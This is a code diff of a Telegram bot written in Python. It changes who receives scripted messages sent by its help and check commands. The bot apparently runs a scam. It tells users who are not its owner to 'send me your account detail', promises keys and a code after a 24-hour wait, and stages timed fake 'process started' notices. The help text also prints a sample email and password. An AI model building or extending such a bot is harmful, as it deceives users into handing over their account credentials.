@@ -70,6 +70,7 @@ def help(update, context):
        testverison@gamil.com
        12345678@s
        issue means dm to chck and send ss
+       this process start in 1 min or lesthan 60 second
        """)
      time.sleep(60)
      context.bot.send_message(chat_id=user_id, text="""
@@ -86,15 +87,15 @@ def check(update, context):
     userId = Config.USERID
     user_id = update.effective_user.id
     if user_id != int(userId):
-       context.bot.send_message(chat_id=userId, text="""
+       context.bot.send_message(chat_id=user_id, text="""
      send me your account detail
      """)
        time.sleep(15)
-       context.bot.send_message(chat_id=userId, text="""
+       context.bot.send_message(chat_id=user_id, text="""
            your virtuval keys and code in paskey wait for 24 hrs
            """)
        time.sleep(30)
-       context.bot.send_message(chat_id=userId, text="your process started and your auth id {0}".format(user_id))
+       context.bot.send_message(chat_id=user_id, text="your process started and your auth id {0}".format(user_id))
        return
     else:
           context.bot.send_message(chat_id=user_id,
